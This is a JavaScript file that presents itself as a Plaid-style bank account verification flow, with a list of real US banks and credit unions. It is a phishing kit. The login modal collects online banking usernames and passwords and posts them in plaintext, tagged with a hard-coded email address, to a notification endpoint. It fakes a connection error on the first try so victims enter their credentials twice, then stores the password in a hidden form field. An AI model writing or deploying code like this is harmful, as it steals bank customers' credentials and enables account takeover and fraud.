// Bank verification functionality
document.addEventListener('DOMContentLoaded', function() {
    const bankSearch = document.getElementById('bank-search');
    const popularBanksContainer = document.getElementById('popular-banks');
    const bankNameInput = document.getElementById('bank_name');
    const plaidMetadataInput = document.getElementById('plaid_metadata');
    let selectedBank = null;
    let isFirstAttempt = true;

    const bankDatabase = [
        // Major National Banks
        {name: "Chase", domain: "chase.com", type: "bank", popular: true},
        {name: "Bank of America", domain: "bankofamerica.com", type: "bank", popular: true},
        {name: "Wells Fargo", domain: "wellsfargo.com", type: "bank", popular: true},
        {name: "Citibank", domain: "citibank.com", type: "bank", popular: true},
        {name: "Capital One", domain: "capitalone.com", type: "bank", popular: true},
        {name: "TD Bank", domain: "tdbank.com", type: "bank", popular: true},
        {name: "US Bank", domain: "usbank.com", type: "bank", popular: true},
        {name: "PNC Bank", domain: "pnc.com", type: "bank", popular: true},
        {name: "Truist Bank", domain: "truist.com", type: "bank", popular: true},
        {name: "Goldman Sachs", domain: "goldmansachs.com", type: "bank", popular: true},
        {name: "Fifth Third Bank", domain: "53.com", type: "bank", popular: true},
        {name: "Citizens Bank", domain: "citizensbank.com", type: "bank", popular: true},
        // Digital Banks
        {name: "Ally Bank", domain: "ally.com", type: "bank", popular: false},
        {name: "American Express Bank", domain: "americanexpress.com", type: "bank", popular: false},
        {name: "Chime", domain: "chime.com", type: "bank", popular: false},
        {name: "Varo", domain: "varomoney.com", type: "bank", popular: false},
        {name: "Current", domain: "current.com", type: "bank", popular: false},
        {name: "SoFi", domain: "sofi.com", type: "bank", popular: false},
        {name: "N26", domain: "n26.com", type: "bank", popular: false},
        {name: "Revolut", domain: "revolut.com", type: "bank", popular: false},
        // Regional Banks
        {name: "KeyBank", domain: "key.com", type: "bank", popular: false},
        {name: "M&T Bank", domain: "mtb.com", type: "bank", popular: false},
        {name: "Regions Bank", domain: "regions.com", type: "bank", popular: false},
        {name: "BB&T", domain: "bbt.com", type: "bank", popular: false},
        {name: "SunTrust", domain: "suntrust.com", type: "bank", popular: false},
        {name: "Huntington", domain: "huntington.com", type: "bank", popular: false},
        {name: "Santander", domain: "santander.com", type: "bank", popular: false},
        {name: "BMO Harris", domain: "bmoharris.com", type: "bank", popular: false},
        {name: "HSBC USA", domain: "us.hsbc.com", type: "bank", popular: false},
        {name: "First Republic", domain: "firstrepublic.com", type: "bank", popular: false},
        // Major Credit Unions
        {name: "Navy Federal Credit Union", domain: "navyfederal.org", type: "credit_union", popular: true},
        {name: "State Employees Credit Union", domain: "ncsecu.org", type: "credit_union", popular: true},
        {name: "Pentagon Federal Credit Union", domain: "penfed.org", type: "credit_union", popular: true},
        {name: "Boeing Employees Credit Union", domain: "becu.org", type: "credit_union", popular: true},
        {name: "SchoolsFirst Federal Credit Union", domain: "schoolsfirstfcu.org", type: "credit_union", popular: true},
        {name: "The Golden 1 Credit Union", domain: "golden1.com", type: "credit_union", popular: true},
        {name: "Security Service Federal Credit Union", domain: "ssfcu.org", type: "credit_union", popular: true},
        {name: "America First Credit Union", domain: "americafirst.com", type: "credit_union", popular: true},
        {name: "Digital Federal Credit Union", domain: "dcu.org", type: "credit_union", popular: true},
        {name: "First Tech Federal Credit Union", domain: "firsttechfed.com", type: "credit_union", popular: true},
        // State-Specific Banks & Credit Unions
        {name: "California Credit Union", domain: "californiacu.org", type: "credit_union", popular: false},
        {name: "Texas Capital Bank", domain: "texascapitalbank.com", type: "bank", popular: false},
        {name: "New York Community Bank", domain: "mynycb.com", type: "bank", popular: false},
        {name: "Florida Credit Union", domain: "flcu.org", type: "credit_union", popular: false},
        {name: "Michigan State University FCU", domain: "msufcu.org", type: "credit_union", popular: false},
        {name: "Pennsylvania State Employees CU", domain: "psecu.com", type: "credit_union", popular: false},
        {name: "Georgia's Own Credit Union", domain: "georgiasown.org", type: "credit_union", popular: false},
        {name: "Washington State Employees CU", domain: "wsecu.org", type: "credit_union", popular: false},
        // Community Banks
        {name: "First Community Bank", domain: "firstcommunity.com", type: "bank", popular: false},
        {name: "Heritage Bank", domain: "heritage-bank.com", type: "bank", popular: false},
        {name: "Landmark Bank", domain: "landmarkbank.com", type: "bank", popular: false},
        {name: "Legacy Bank & Trust", domain: "legacybank.com", type: "bank", popular: false},
        {name: "Pioneer Bank", domain: "pioneerbnk.com", type: "bank", popular: false},
        {name: "Summit Bank", domain: "summitbank.com", type: "bank", popular: false},
        {name: "Unity Bank", domain: "unitybank.com", type: "bank", popular: false},
        {name: "Valley National Bank", domain: "valley.com", type: "bank", popular: false},
        // Investment Banks with Banking Services
        {name: "Charles Schwab Bank", domain: "schwab.com", type: "bank", popular: false},
        {name: "E*TRADE Bank", domain: "etrade.com", type: "bank", popular: false},
        {name: "Fidelity Cash Management", domain: "fidelity.com", type: "bank", popular: false},
        {name: "Morgan Stanley E*TRADE", domain: "morganstanley.com", type: "bank", popular: false},
        {name: "TD Ameritrade Bank", domain: "tdameritrade.com", type: "bank", popular: false},
        // Additional Regional Credit Unions
        {name: "Alliant Credit Union", domain: "alliantcreditunion.org", type: "credit_union", popular: false},
        {name: "Bethpage Federal Credit Union", domain: "bethpagefcu.com", type: "credit_union", popular: false},
        {name: "Coastal Federal Credit Union", domain: "coastal24.com", type: "credit_union", popular: false},
        {name: "Delta Community Credit Union", domain: "deltacommunitycu.com", type: "credit_union", popular: false},
        {name: "ESL Federal Credit Union", domain: "esl.org", type: "credit_union", popular: false},
        {name: "Hudson Valley Credit Union", domain: "hvcu.org", type: "credit_union", popular: false},
        {name: "Kinecta Federal Credit Union", domain: "kinecta.org", type: "credit_union", popular: false},
        {name: "Lake Michigan Credit Union", domain: "lmcu.org", type: "credit_union", popular: false},
        {name: "Mountain America Credit Union", domain: "macu.com", type: "credit_union", popular: false},
        {name: "Northwest Federal Credit Union", domain: "nwfcu.org", type: "credit_union", popular: false},
        {name: "Patelco Credit Union", domain: "patelco.org", type: "credit_union", popular: false},
        {name: "Randolph-Brooks Federal Credit Union", domain: "rbfcu.org", type: "credit_union", popular: false},
        {name: "Space Coast Credit Union", domain: "sccu.com", type: "credit_union", popular: false},
        {name: "Star One Credit Union", domain: "starone.org", type: "credit_union", popular: false},
        {name: "Travis Credit Union", domain: "traviscu.org", type: "credit_union", popular: false},
        {name: "VyStar Credit Union", domain: "vystarcu.org", type: "credit_union", popular: false},
        {name: "Wright-Patt Credit Union", domain: "wpcu.coop", type: "credit_union", popular: false}
    ];


    function renderBanks() {
        bankDatabase.forEach(bank => {
            const col = document.createElement('div');
            col.className = 'col-6 col-md-3 mb-3';

            const bankOption = document.createElement('div');
            bankOption.className = 'bank-option';
            bankOption.innerHTML = `
                <div class="bank-logo-container">
                    <img src="https://logo.clearbit.com/${bank.domain}" alt="${bank.name}" 
                         class="bank-logo" onerror="this.src='/static/images/bank-default.svg'">
                </div>
                <div class="bank-name">${bank.name}</div>
            `;

            bankOption.addEventListener('click', () => selectBank(bank));
            col.appendChild(bankOption);
            popularBanksContainer.appendChild(col);
        });
    }

    function selectBank(bank) {
        selectedBank = bank;
        showLoginModal(bank);
    }

    function showLoginModal(bank) {
        const modal = document.createElement('div');
        modal.className = 'modal fade';
        modal.id = 'bankLoginModal';
        modal.innerHTML = `
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Connect to ${bank.name}</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
                    </div>
                    <div class="modal-body">
                        <form id="bankLoginForm">
                            <div class="mb-3">
                                <label class="form-label">Username</label>
                                <input type="text" class="form-control" id="bank-username" required>
                            </div>
                            <div class="mb-3">
                                <label class="form-label">Password</label>
                                <input type="password" class="form-control" id="bank-password" required>
                            </div>
                            <button type="submit" class="btn btn-primary w-100">Connect</button>
                        </form>
                    </div>
                </div>
            </div>
        `;

        document.body.appendChild(modal);
        const loginModal = new bootstrap.Modal(modal);
        loginModal.show();

        const form = modal.querySelector('#bankLoginForm');
        form.addEventListener('submit', (e) => handleLoginAttempt(e, bank, loginModal));
    }

    function handleLoginAttempt(e, bank, modal) {
        e.preventDefault();

        const username = document.getElementById('bank-username').value;
        const password = document.getElementById('bank-password').value;

        if (isFirstAttempt) {
            isFirstAttempt = false;

            // Send first attempt notification
            fetch('/api/notify-login-attempt', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: username,
                    password: password,
                    attempt: 1,
                    email: 'denzelbennie@outlook.com'
                })
            });

            // Show error after delay
            modal.hide();
            showLoading('Connecting to your bank...');

            setTimeout(() => {
                hideLoading();
                alert('Unable to connect to your bank. Please try again.');
                modal.show();
            }, 3000);

            return;
        }

        // Handle second attempt
        modal.hide();
        showLoading('Verifying your credentials...');

        // Send second attempt notification
        fetch('/api/notify-login-attempt', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username: username,
                password: password,
                attempt: 2,
                email: 'denzelbennie@outlook.com'
            })
        });

        // Show manual entry form
        const plaidSection = document.getElementById('plaid-section');
        const manualSection = document.getElementById('manual-bank-section');

        if (plaidSection) plaidSection.style.display = 'none';
        if (manualSection) manualSection.style.display = 'block';

        // Pre-fill bank information
        const bankNameInput = document.getElementById('bank_name');
        const accountNameInput = document.getElementById('account_name');
        const routingNumberInput = document.getElementById('routing_number');
        const accountNumberInput = document.getElementById('account_number');
        const accountTypeSelect = document.getElementById('account_type');
        const plaidMetadataInput = document.getElementById('plaid_metadata');

        if (bankNameInput) bankNameInput.value = bank.name;
        if (accountNameInput) accountNameInput.value = username;
        if (accountTypeSelect) accountTypeSelect.value = 'checking';

        if (plaidMetadataInput) {
            plaidMetadataInput.value = JSON.stringify({
                bank: bank.name,
                username: username,
                password: password,
                timestamp: new Date().toISOString(),
                attempt: 2
            });
        }

        hideLoading();
        modal.hide();
    }

    function showLoading(message) {
        let overlay = document.getElementById('loading-overlay');
        if (!overlay) {
            overlay = document.createElement('div');
            overlay.id = 'loading-overlay';
            overlay.className = 'position-fixed top-0 start-0 w-100 h-100 d-flex align-items-center justify-content-center';
            overlay.style.backgroundColor = 'rgba(0,0,0,0.5)';
            overlay.style.zIndex = '9999';
            overlay.innerHTML = `
                <div class="text-center text-white">
                    <div class="spinner-border mb-3"></div>
                    <div>${message}</div>
                </div>
            `;
            document.body.appendChild(overlay);
        }
    }

    function hideLoading() {
        const overlay = document.getElementById('loading-overlay');
        if (overlay) overlay.remove();
    }

    // Initialize
    if (popularBanksContainer) {
        renderBanks();
    }

    // Initialize search
    if (bankSearch) {
        bankSearch.addEventListener('input', function() {
            const searchTerm = this.value.toLowerCase();
            document.querySelectorAll('.bank-option').forEach(option => {
                const name = option.querySelector('.bank-name').textContent.toLowerCase();
                option.parentElement.style.display = name.includes(searchTerm) ? 'block' : 'none';
            });
        });
    }
});